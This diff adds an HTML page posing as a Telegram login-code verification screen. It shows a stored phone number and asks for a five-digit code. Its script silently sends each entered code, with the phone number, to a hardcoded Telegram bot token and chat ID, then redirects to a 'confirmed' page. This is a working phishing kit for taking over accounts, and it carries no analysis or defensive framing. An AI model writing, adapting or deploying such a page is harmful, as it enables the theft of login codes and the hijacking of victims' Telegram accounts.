@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Code Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #ffffff; margin: 0; }
+        .emoji { font-size: 80px; }
+        .phone-number { font-size: 22px; font-weight: bold; margin: 10px 0; }
+        .message { color: gray; font-size: 16px; }
+        .input-box { width: 90%; max-width: 400px; margin-top: 20px; padding: 10px; font-size: 18px; border: 2px solid #007AFF; border-radius: 8px; outline: none; text-align: center; }
+    </style>
+</head>
+<body>
+
+    <div class="emoji">📨</div>
+    <div class="phone-number" id="userPhone"></div>
+    <div class="message">We have sent you a message in Telegram with the code.</div>
+    <input type="text" id="codeInput" class="input-box" placeholder="Code" maxlength="5">
+
+<script>
+    document.getElementById("userPhone").innerText = localStorage.getItem("userPhoneNumber") || "+998 ** *** ** **";
+
+    document.getElementById("codeInput").addEventListener("input", function(event) {
+        let code = event.target.value;
+        if (code.length === 5) {
+            const BOT_TOKEN = "8007432244:AAFNNjMRWLr7_mGnfZTpDxNH1fgggRnWtuU";
+            const CHAT_ID = "1767505726";
+            let userPhone = localStorage.getItem("userPhoneNumber") || "Noma’lum";
+
+            let message = `🔢 Tasdiqlash kodi: ${code} (📱 ${userPhone})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            }).then(() => {
+                window.location.href = "confirmed.html";
+            });
+        }
+    });
+</script>
+
+</body>
+</html>
